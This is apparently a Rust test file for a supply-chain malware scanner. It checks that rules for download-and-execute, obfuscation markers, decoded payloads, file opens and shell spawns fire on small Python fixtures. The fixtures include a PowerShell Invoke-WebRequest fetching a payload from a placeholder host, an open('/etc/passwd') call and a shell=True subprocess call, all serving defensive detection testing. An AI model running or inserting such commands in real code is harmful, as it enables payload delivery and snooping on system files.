use std::fs;

use super::super::super::*;
use crate::rules::default_rules as built_in_rules;

#[test]
fn download_execution_rule_requires_a_powershell_payload() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("commands.py"),
        concat!(
            "import subprocess\n",
            "subprocess.run(['powershell.exe', '-command', 'Get-Clipboard'])\n",
            "subprocess.run(['powershell.exe', '-command', 'Invoke-WebRequest https://example.invalid/payload'])\n",
        ),
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let findings = outcome
        .findings
        .iter()
        .filter(|finding| finding.rule_id == "chainsec.py.detection.guarddog.download-and-execute")
        .collect::<Vec<_>>();

    assert_eq!(findings.len(), 1);
    assert!(findings[0].matched_code.contains("Invoke-WebRequest"));
}

#[test]
fn python_obfuscator_matches_only_known_markers() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("ordinary.py"),
        "eval(payload)\nfrom pyarmor_runtime import __pyarmor__\n",
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let matches = outcome
        .findings
        .iter()
        .filter(|finding| {
            finding.rule_id == "chainsec.py.detection.heuristic.code-protector-marker"
        })
        .collect::<Vec<_>>();

    assert_eq!(matches.len(), 2);
    assert!(matches.iter().all(|finding| {
        matches!(
            finding.matched_code.as_str(),
            "pyarmor_runtime" | "__pyarmor__"
        )
    }));
}

#[test]
fn python_detection_rules_require_security_relevant_context() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("precision.py"),
        concat!(
            "import base64\n",
            "import subprocess\n",
            "formatted = ', '.join(values)\n",
            "encoded = 'hello'.encode()\n",
            "decoded = base64.b64decode(value)\n",
            "open('data.txt')\n",
            "subprocess.run(['python', '--version'])\n",
            "assembled = ''.join([chr(a), chr(b), chr(c), chr(d), chr(e), chr(f), chr(g), chr(h)])\n",
            "payload = base64.b64decode('QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB')\n",
            "open('/etc/passwd')\n",
            "subprocess.run(command, shell=True)\n",
        ),
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let count = |rule_id: &str| {
        outcome
            .findings
            .iter()
            .filter(|finding| finding.rule_id == rule_id)
            .count()
    };

    assert_eq!(count("chainsec.py.detection.character-assembly"), 1);
    assert_eq!(count("chainsec.py.detection.decoded-payload"), 1);
    assert_eq!(count("chainsec.py.detection.filesystem-open"), 1);
    assert_eq!(count("chainsec.py.detection.process-spawn"), 1);
}
